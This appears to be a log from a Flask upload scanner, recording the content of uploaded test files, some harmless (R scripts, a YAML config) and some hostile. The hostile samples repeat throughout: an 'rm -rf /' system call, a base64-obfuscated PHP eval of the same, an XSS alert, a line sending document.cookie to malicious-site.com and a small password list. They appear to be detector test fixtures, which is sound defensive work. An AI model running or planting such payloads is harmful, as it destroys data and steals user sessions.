2025-02-22 20:51:27,756 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:51:27,757 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:27,759 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:27,760 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:27,761 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:27,762 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:27,763 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:51:27,769 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:27,770 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:27,771 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:27,772 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:27,773 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:27,774 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:27,775 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:27,776 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:27,777 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:27,778 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:27,780 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:27,781 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:27,782 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:27,783 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:27,784 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:27,785 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:27,786 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:27,788 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:27,789 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:27,790 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:27,791 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:27,792 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:27,794 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:27,795 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:27,796 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:27,797 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:27,798 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:27,799 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:27,800 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:27,801 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:27,802 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:27,803 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:27,804 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:27,805 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:27,806 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:27,807 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:27,808 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:27,810 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:27,811 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:27,812 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:27,813 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:27,814 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:27,815 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:27,816 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:27,817 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:27,818 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:27,819 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:47,178 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:51:47,183 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:51:47,184 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:51:47,187 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:51:47,189 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:47,190 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:47,191 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:47,192 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:47,193 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:47,194 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:51:47,200 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:47,201 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:47,203 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:51:47,205 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:51:47,207 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:51:47,210 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:51:47,211 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:47,212 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:47,213 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:47,214 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:47,215 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:47,216 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:51:47,222 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:47,223 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:47,224 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:51:47,227 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:51:47,228 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:51:47,231 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:51:47,232 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:47,233 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:47,234 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:47,235 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:47,236 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:47,238 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:51:47,243 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:47,244 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:51:47,245 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:47,246 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:47,247 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:47,249 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:47,250 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:47,252 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:47,253 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:47,254 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:51:47,255 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:51:47,257 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:51:47,258 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:51:47,259 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:51:47,260 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:51:47,262 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:51:47,263 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:51:47,265 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
